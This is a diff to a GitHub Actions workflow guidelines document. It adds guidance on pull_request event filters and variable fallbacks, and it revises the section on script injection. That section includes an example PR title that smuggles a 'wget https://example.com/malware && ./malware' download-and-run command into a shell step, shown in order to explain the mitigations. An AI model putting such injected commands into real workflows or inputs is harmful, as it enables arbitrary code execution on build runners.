@@ -76,6 +76,36 @@ understood from the YAML data structure and the workflow/action schema.
   work as expected. Do this by testing all the possible scenarios that could
   trigger each workflow.
 
+=== Events
+
+For some event types such as `pull_request`, if you do not specify the _types_
+of PR events on which you want your workflow to run, GitHub will assume default
+activity types. Better, then, to be explicit about the specific event types that
+you want to trigger your workflows.
+
+In the following example, event filters and activity types are used to refine
+the `pull_request` event trigger. This workflow will run only when a PR is opened
+or synchronized (ie when the HEAD commit of the PR changes), and only for PRs
+whose base branch is either `main` or `dev`.
+
+[source,yaml]
+----
+on:
+  pull_request:
+    types:
+      - opened
+      - synchronize
+    branches:
+      - main
+      - dev
+
+jobs:
+  echo:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Running whenever a PR is opened or synchronized AND base branch is (main OR dev)"
+----
+
 === Jobs
 
 A single job may, for example, compile, test _and_ deploy an application. Though
@@ -147,6 +177,22 @@ jobs:
       - name: Install bats
         run: npm install -g bats
 ----
+
+=== Repository and environment variables
+
+Workflows SHOULD include fallback values for variables that are supposed to be
+configured via the repository itself. The purpose is to protect the workflow
+from those variables being accidentally deleted from the repository's
+configuration.
+
+[source,yaml]
+----
+env:
+  MY_ENV_VAR: ${{ vars.MY_ENV_VAR || 'default value' }}
+----
+
+For secrets, workflow scripts MUST check for a valid value and fail the step
+if a secret is missing.
 
 == Performance
 
@@ -367,10 +413,10 @@ a" && wget https://example.com/malware && ./malware && echo "Title
 
 [source,txt]
 ----
-echo “a" && wget https://example.com/malware && ./malware && echo "Title” | commitlint
+echo "a" && wget https://example.com/malware && ./malware && echo "Title" | commitlint
 ----
 
-The following event context data cannot be trusted:
+The following context data cannot be trusted:
 
 * `github.event.issue.title`
 * `github.event.issue.body`
@@ -390,17 +436,25 @@ The following event context data cannot be trusted:
 * `github.event.pull_request.head.repo.default_branch`
 * `github.head_ref`
 
-There are two possible solutions. The RECOMMENDED one is to create custom
-actions with input arguments, rater than executing inline shell scripts:
+There are two possible solutions. The RECOMMENDED one – the safest one – is to
+extract the scripts to custom actions, which accept the inputs via their
+arguments. These SHOULD be JavaScript or container actions. The risks
+associated with script injection are reduced because the action's code is
+run in an isolated environment, rather than directly in the runner.
 
 [source,yaml]
 ----
-uses: fakeaction/printtitle@v3
+uses: ./.github/actions/print
 with:
-  title: ${{ github.event.pull_request.title }}
+  text: ${{ github.event.pull_request.title }}
 ----
 
-Alternatively, bind the value to an intermediate environment variable:
+A second option is to bind the input value to an intermediate environment
+variable, and then print the value from that variable. This reduces the risks
+of script injection because the input value is not directly interpolated
+into the shell script. But this is not proper input sanitization, and this
+solution is not as robust as the first option. Nevertheless, it is probably
+perfectly adequate for private repositories where you trust the contributors.
 
 [source,yaml]
 ----
